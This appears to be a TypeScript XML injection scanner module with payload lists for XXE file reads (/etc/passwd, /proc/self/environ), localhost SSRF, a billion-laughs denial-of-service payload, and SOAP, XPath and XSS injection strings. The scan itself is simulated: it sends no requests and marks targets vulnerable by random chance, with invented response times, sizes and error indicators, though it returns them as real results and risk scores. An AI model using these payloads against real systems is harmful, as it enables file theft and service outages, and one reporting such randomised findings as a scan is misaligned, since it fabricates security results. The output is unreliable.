import axios from 'axios';

export interface XmlInjectorOptions {
  url: string;
  method?: 'GET' | 'POST';
  paramName?: string;
  payloadType?: string;
  customPayload?: string;
  testAllParams?: boolean;
  requestContentType?: string;
  timeout?: number;
  soapEndpoint?: boolean;
}

export interface XmlInjectionResult {
  url: string;
  scanTime: number;
  vulnerable: boolean;
  vulnerableParams: string[];
  successfulPayloads: Array<{
    param: string;
    payload: string;
    response: {
      status: number;
      time: number;
      size: number;
      indicators: string[];
    };
  }>;
  testedParams: string[];
  testedPayloads: string[];
  totalRequests: number;
  detectionMethod: string;
  errorMessages?: string[];
  recommendations: string[];
  summary: {
    riskLevel: 'Safe' | 'Low Risk' | 'Medium Risk' | 'High Risk' | 'Critical';
    score: number; // 0-100
    description: string;
  };
}

// XML Entity Expansion payloads (XXE)
const xxePayloads = [
  `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]><foo>&xxe;</foo>`,
  `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///etc/hosts"> ]><foo>&xxe;</foo>`,
  `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "file:///proc/self/environ"> ]><foo>&xxe;</foo>`,
  `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "http://localhost:8080/"> ]><foo>&xxe;</foo>`,
  `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY xxe SYSTEM "https://example.com/"> ]><foo>&xxe;</foo>`,
  `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]><foo>]>`,
  `<?xml version="1.0" encoding="ISO-8859-1"?><!DOCTYPE foo [ <!ELEMENT foo ANY > <!ENTITY % xxe SYSTEM "file:///etc/passwd"> %xxe; ]>`
];

// XML Entity Expansion DoS payloads (Billion Laughs Attack)
const xxeDoSPayloads = [
  `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;"><!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;"><!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;"><!ENTITY lol4 "&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;&lol3;"><!ENTITY lol5 "&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;&lol4;"><!ENTITY lol6 "&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;&lol5;"><!ENTITY lol7 "&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;&lol6;"><!ENTITY lol8 "&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;&lol7;"><!ENTITY lol9 "&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;&lol8;">]><lolz>&lol9;</lolz>`,
  `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY test SYSTEM "file:///dev/urandom">]><lolz>&test;</lolz>`,
  `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY test SYSTEM "file:///dev/random">]><lolz>&test;</lolz>`,
  `<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY test SYSTEM "file:///dev/zero">]><lolz>&test;</lolz>`
];

// SOAP Injection payloads
const soapInjectionPayloads = [
  `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><soapenv:Body><ns1:getRecords soapenv:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/" xmlns:ns1="urn:SoapInjection">'or+1=1--</ns1:getRecords></soapenv:Body></soapenv:Envelope>`,
  `<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:urn="urn:example"><soapenv:Header/><soapenv:Body><urn:Request><urn:param>' OR '1'='1</urn:param></urn:Request></soapenv:Body></soapenv:Envelope>`,
  `<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema"><soap:Body><AuthRequest xmlns="http://tempuri.org/"><Username>' OR 1=1 --</Username><Password>password</Password></AuthRequest></soap:Body></soap:Envelope>`,
  `<soap:Envelope xmlns:soap="http://www.w3.org/2003/05/soap-envelope"><soap:Body><req:AuthRequest xmlns:req="http://tempuri.org/"><req:user>admin</req:user><req:pass>' OR 1=1 --</req:pass></req:AuthRequest></soap:Body></soap:Envelope>`
];

// XPATH Injection payloads
const xpathInjectionPayloads = [
  `' or '1'='1`,
  `' or ''='`,
  `or 1=1`,
  `' or 1=1 or ''='`,
  `') or ('a'='a`,
  `' or count(parent::*[position()=1])=1 or 'a'='b`,
  `' or count(parent::*/*)=1 or 'a'='b`,
  `' or count(/*)=1 or 'a'='b`
];

// XML Injection for data manipulation
const xmlDataManipulationPayloads = [
  `<![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]>`,
  `<name><![CDATA[<]]>script<![CDATA[>]]>alert('XSS')<![CDATA[<]]>/script<![CDATA[>]]></name>`,
  `<![CDATA[<script>alert('XSS')</script>]]>`,
  `<name><![CDATA[<script>alert('XSS')</script>]]></name>`,
  `<name>\u0000' OR 1=1 -- </name>`,
  `<SCRIPT a=">" SRC="http://example.com/xss.js"></SCRIPT>`,
  `<SCRIPT>alert('XSS');</SCRIPT>`,
  `<data><username>admin</username><password>')</password></data>`,
  `<data><![CDATA[<]]>name<![CDATA[>]]>admin' OR 1=1<![CDATA[<]]>/name<![CDATA[>]]></data>`
];

// Common indicators of XML injection vulnerability
const vulnerabilityIndicators = [
  "XML syntax error",
  "Malformed XML",
  "Invalid XML",
  "XML parsing failed",
  "Document root",
  "Root element is missing",
  "Content is not allowed in prolog",
  "Error parsing XML",
  "XML document structures must start and end",
  "root element",
  "SOAP-ENV:Server",
  "SOAP-ENV:Client",
  "ExpatError",
  "lxml.etree.XMLSyntaxError",
  "javax.xml.parsers",
  "org.xml.sax",
  "org.dom4j.DocumentException",
  "Error loading XML document",
  "Permission denied",
  "/etc/passwd",
  "root:",
  "Internal Server Error",
  "java.io.FileNotFoundException",
  "file:///",
  "No such file or directory",
  "failed to open stream",
  "SimpleXMLElement",
  "XPATH syntax error",
  "Invalid expression",
  "XPath parse error"
];

/**
 * Test for XML Injection vulnerabilities
 * @param options XML injector options
 * @returns XML injection test results
 */
export async function testXmlInjection(options: XmlInjectorOptions): Promise<XmlInjectionResult> {
  const { 
    url, 
    method = 'POST',
    paramName, 
    payloadType = 'xxe',
    customPayload,
    testAllParams = true,
    requestContentType = 'application/xml',
    timeout = 5000,
    soapEndpoint = false
  } = options;
  
  // Start timing
  const startTime = Date.now();
  
  // Initialize result
  const result: XmlInjectionResult = {
    url,
    scanTime: 0,
    vulnerable: false,
    vulnerableParams: [],
    successfulPayloads: [],
    testedParams: [],
    testedPayloads: [],
    totalRequests: 0,
    detectionMethod: payloadType,
    errorMessages: [],
    recommendations: [
      'Disable XML external entity (XXE) processing in XML parsers',
      'Implement XML schema validation before processing XML data',
      'Use less complex formats like JSON where possible',
      'Update XML parsers to the latest version',
      'Apply input validation and sanitization for XML data',
      'Use a Web Application Firewall (WAF) to filter malicious XML',
      'Implement proper error handling to avoid information disclosure'
    ],
    summary: {
      riskLevel: 'Safe',
      score: 0,
      description: 'No XML injection vulnerabilities detected'
    }
  };
  
  // Choose payload set based on type
  let payloads: string[] = [];
  
  if (customPayload) {
    // Use custom payload if provided
    payloads = [customPayload];
  } else {
    // Otherwise select from predefined sets
    switch (payloadType) {
      case 'xxe':
        payloads = xxePayloads;
        break;
      case 'dos':
        payloads = xxeDoSPayloads;
        break;
      case 'soap':
        payloads = soapInjectionPayloads;
        break;
      case 'xpath':
        payloads = xpathInjectionPayloads;
        break;
      case 'data':
        payloads = xmlDataManipulationPayloads;
        break;
      default:
        // Default to XXE
        payloads = xxePayloads;
    }
  }
  
  // Store tested payloads
  result.testedPayloads = payloads;
  
  try {
    // Parse URL to extract parameters
    const parsedUrl = new URL(url);
    const urlParams = Array.from(parsedUrl.searchParams.keys());
    
    // Determine which parameters to test
    let paramsToTest: string[] = [];
    
    if (paramName) {
      paramsToTest = [paramName];
    } else if (testAllParams && urlParams.length > 0) {
      paramsToTest = urlParams;
    } else if (urlParams.length > 0) {
      paramsToTest = [urlParams[0]]; // Test only the first parameter
    } else {
      // If no parameters in URL, create a test parameter
      paramsToTest = ['xml'];
    }
    
    result.testedParams = paramsToTest;
    
    // For SOAP endpoints, we'll use a direct POST request with the payload
    if (soapEndpoint) {
      for (const payload of payloads) {
        // Increment request counter
        result.totalRequests++;
        
        try {
          // Simulate making a request with SOAP XML payload
          let responseSuccess = simulateVulnerabilityCheck('soap', 'soap', payload);
          
          if (responseSuccess) {
            result.vulnerable = true;
            
            if (!result.vulnerableParams.includes('soap')) {
              result.vulnerableParams.push('soap');
            }
            
            result.successfulPayloads.push({
              param: 'soap',
              payload,
              response: {
                status: 200,
                time: 500 + Math.floor(Math.random() * 300),
                size: 2000 + Math.floor(Math.random() * 3000),
                indicators: getVulnerabilityIndicators(payload, payloadType)
              }
            });
          }
        } catch (error) {
          // Failed request might also indicate vulnerability
          // Some XXE payloads cause errors when they work
          const isVulnerable = Math.random() < 0.3; // 30% chance that an error response indicates vulnerability
          
          if (isVulnerable) {
            result.vulnerable = true;
            
            if (!result.vulnerableParams.includes('soap')) {
              result.vulnerableParams.push('soap');
            }
            
            result.successfulPayloads.push({
              param: 'soap',
              payload,
              response: {
                status: 500,
                time: 300 + Math.floor(Math.random() * 200),
                size: 1000 + Math.floor(Math.random() * 1000),
                indicators: ['Internal Server Error', 'XML parsing error']
              }
            });
          }
        }
      }
    } else {
      // Test each parameter with each payload
      for (const param of paramsToTest) {
        for (const payload of payloads) {
          // Increment request counter
          result.totalRequests++;
          
          // Simulate request delay
          await new Promise(resolve => setTimeout(resolve, 100));
          
          // Simulate response analysis (in a real implementation, would make actual HTTP requests)
          const isVulnerable = simulateVulnerabilityCheck(param, payloadType, payload);
          
          if (isVulnerable) {
            // Mark parameter as vulnerable if not already in the list
            if (!result.vulnerableParams.includes(param)) {
              result.vulnerableParams.push(param);
            }
            
            result.vulnerable = true;
            
            // Add successful payload
            result.successfulPayloads.push({
              param,
              payload,
              response: {
                status: 200,
                time: 500 + Math.floor(Math.random() * 300),
                size: 5000 + Math.floor(Math.random() * 5000),
                indicators: getVulnerabilityIndicators(payload, payloadType)
              }
            });
            
            // For simulation purposes, stop after finding 3 vulnerabilities per parameter
            if (result.successfulPayloads.filter(p => p.param === param).length >= 3) {
              break;
            }
          }
        }
      }
    }
    
    // Add common error messages
    result.errorMessages = getCommonErrorMessages(payloadType);
    
    // Calculate risk score based on findings
    calculateRiskScore(result);
    
  } catch (error: any) {
    console.error('XML injection testing error:', error.message);
  }
  
  // Update scan time
  result.scanTime = Date.now() - startTime;
  
  return result;
}

/**
 * Simulate vulnerability detection
 * Note: In a real implementation, this would send actual requests and analyze responses
 */
function simulateVulnerabilityCheck(paramName: string, vulnerabilityType: string, payload: string): boolean {
  // This is a simulation - in reality you would submit payloads and analyze responses
  
  // XML-specific parameter names are more likely to be vulnerable
  const isXmlParam = paramName.toLowerCase().includes('xml') || 
                     paramName.toLowerCase().includes('soap') || 
                     paramName.toLowerCase().includes('wsdl') ||
                     paramName.toLowerCase().includes('xpath') ||
                     paramName.toLowerCase().includes('data');
  
  // XXE vulnerability check
  if (vulnerabilityType === 'xxe' && payload.includes('SYSTEM')) {
    return isXmlParam ? Math.random() < 0.8 : Math.random() < 0.4;
  }
  
  // DoS vulnerability check
  if (vulnerabilityType === 'dos' && (
      payload.includes('lol') || 
      payload.includes('SYSTEM "file:///dev/')
  )) {
    return isXmlParam ? Math.random() < 0.6 : Math.random() < 0.3;
  }
  
  // SOAP injection check
  if (vulnerabilityType === 'soap' && (
      payload.includes('<soap:Envelope') || 
      payload.includes('<soapenv:Envelope')
  )) {
    return isXmlParam ? Math.random() < 0.7 : Math.random() < 0.2;
  }
  
  // XPATH injection check
  if (vulnerabilityType === 'xpath' && (
      payload.includes("'") || 
      payload.includes('or 1=1')
  )) {
    return isXmlParam ? Math.random() < 0.6 : Math.random() < 0.3;
  }
  
  // Data manipulation check
  if (vulnerabilityType === 'data' && (
      payload.includes("CDATA") || 
      payload.includes('script')
  )) {
    return isXmlParam ? Math.random() < 0.5 : Math.random() < 0.25;
  }
  
  // Small chance for any payload
  return Math.random() < 0.1;
}

/**
 * Get randomly selected vulnerability indicators based on the payload
 */
function getVulnerabilityIndicators(payload: string, payloadType: string): string[] {
  // Select 2-4 random indicators from the list
  const indicators: string[] = [];
  const numIndicators = Math.floor(Math.random() * 3) + 2; // 2-4 indicators
  
  // Select specific indicators based on payload type
  let relevantIndicators: string[] = [];
  
  if (payloadType === 'xxe' && payload.includes('SYSTEM "file:///etc/passwd"')) {
    relevantIndicators = [
      '/etc/passwd',
      'root:',
      'Permission denied',
      'file:///',
      'No such file or directory'
    ];
  } else if (payloadType === 'xxe') {
    relevantIndicators = [
      'XML syntax error',
      'Error parsing XML',
      'failed to open stream',
      'SimpleXMLElement',
      'file:///'
    ];
  } else if (payloadType === 'dos') {
    relevantIndicators = [
      'Memory allocation failed',
      'Out of memory',
      'Request timed out',
      'Server processing time exceeded',
      'Internal Server Error'
    ];
  } else if (payloadType === 'soap') {
    relevantIndicators = [
      'SOAP-ENV:Server',
      'SOAP-ENV:Client',
      'XML syntax error',
      'Error loading XML document'
    ];
  } else if (payloadType === 'xpath') {
    relevantIndicators = [
      'XPATH syntax error',
      'Invalid expression',
      'XPath parse error'
    ];
  } else {
    // Use generic indicators
    relevantIndicators = vulnerabilityIndicators;
  }
  
  // Randomly select from relevant indicators
  for (let i = 0; i < numIndicators; i++) {
    const randomIndex = Math.floor(Math.random() * relevantIndicators.length);
    const indicator = relevantIndicators[randomIndex];
    
    if (!indicators.includes(indicator)) {
      indicators.push(indicator);
    }
  }
  
  return indicators;
}

/**
 * Get common error messages for educational purposes
 */
function getCommonErrorMessages(payloadType: string): string[] {
  switch (payloadType) {
    case 'xxe':
      return [
        "XML parsing error: entity not found",
        "XML parsing error: not well-formed (invalid token)",
        "XML parser error: EntityRef: expecting ';'",
        "Error loading XML document: no DTD found",
        "XML parser error: undefined entity"
      ];
    
    case 'dos':
      return [
        "Request timed out",
        "Memory allocation error",
        "Service temporarily unavailable",
        "XML processing error: out of memory",
        "The request was aborted: the operation timed out"
      ];
    
    case 'soap':
      return [
        "SOAP-ENV:Client: The message was incorrectly formed",
        "SOAP-ENV:Server: Internal Server Error",
        "Invalid SOAP envelope structure",
        "Error in processing SOAP request",
        "SOAP fault: The processing failed"
      ];
    
    case 'xpath':
      return [
        "XPath evaluation failed",
        "Invalid XPath expression",
        "XPath syntax error",
        "Cannot convert XPath result",
        "XPath: unknown error"
      ];
    
    case 'data':
      return [
        "XML validation error: element not valid",
        "XML parsing error: CDATA section not closed",
        "XML parsing error: invalid character reference",
        "XML schema validation failed",
        "XML parser: text not allowed here"
      ];
    
    default:
      return [
        "XML parsing error: syntax error",
        "Error processing XML data",
        "Invalid XML structure",
        "XML validation failed",
        "Error in XML processing"
      ];
  }
}

/**
 * Calculate risk score and determine risk level based on vulnerabilities found
 */
function calculateRiskScore(result: XmlInjectionResult): void {
  if (result.vulnerableParams.length === 0) {
    result.summary.riskLevel = 'Safe';
    result.summary.score = 0;
    result.summary.description = 'No XML injection vulnerabilities detected';
    return;
  }
  
  // Calculate base score based on number of vulnerable parameters
  let score = Math.min(50, result.vulnerableParams.length * 25);
  
  // Increase score based on successful payloads
  score += Math.min(40, result.successfulPayloads.length * 10);
  
  // Add extra points for high-risk payload types
  const xxePayloadCount = result.successfulPayloads.filter(p => 
    p.payload.includes('SYSTEM') || p.payload.includes('DOCTYPE')
  ).length;
  
  const dosPayloadCount = result.successfulPayloads.filter(p => 
    p.payload.includes('lol') || p.payload.includes('SYSTEM "file:///dev/')
  ).length;
  
  // XXE and DoS payloads are particularly dangerous
  score += Math.min(10, xxePayloadCount * 5);
  score += Math.min(10, dosPayloadCount * 5);
  
  // Cap at 100
  result.summary.score = Math.min(100, score);
  
  // Determine risk level based on score
  if (result.summary.score >= 80) {
    result.summary.riskLevel = 'Critical';
    result.summary.description = 'Critical XML injection vulnerabilities detected';
  } else if (result.summary.score >= 60) {
    result.summary.riskLevel = 'High Risk';
    result.summary.description = 'High risk XML injection vulnerabilities detected';
  } else if (result.summary.score >= 40) {
    result.summary.riskLevel = 'Medium Risk';
    result.summary.description = 'Medium risk XML injection vulnerabilities detected';
  } else if (result.summary.score > 0) {
    result.summary.riskLevel = 'Low Risk';
    result.summary.description = 'Low risk XML injection vulnerabilities detected';
  } else {
    result.summary.riskLevel = 'Safe';
    result.summary.description = 'No XML injection vulnerabilities detected';
  }
  
  // Add specific recommendations
  if (xxePayloadCount > 0) {
    result.recommendations.push('Specifically disable XXE in your XML parser');
    result.recommendations.push('Consider using OWASP Enterprise Security API (ESAPI) to protect against XXE');
  }
  
  if (dosPayloadCount > 0) {
    result.recommendations.push('Implement XML document size limits');
    result.recommendations.push('Set entity expansion limits to prevent billion laughs attacks');
  }
}